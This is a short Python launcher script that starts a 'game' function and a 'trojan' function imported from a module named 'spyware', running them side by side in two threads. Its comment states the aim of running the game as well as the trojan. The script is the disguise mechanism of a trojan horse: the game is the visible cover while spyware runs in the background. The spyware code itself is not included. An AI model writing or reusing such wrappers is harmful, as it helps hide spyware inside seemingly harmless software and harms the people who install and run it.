from game import game
from spyware import trojan
import threading

# two threads to run game as well as trojan 
t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()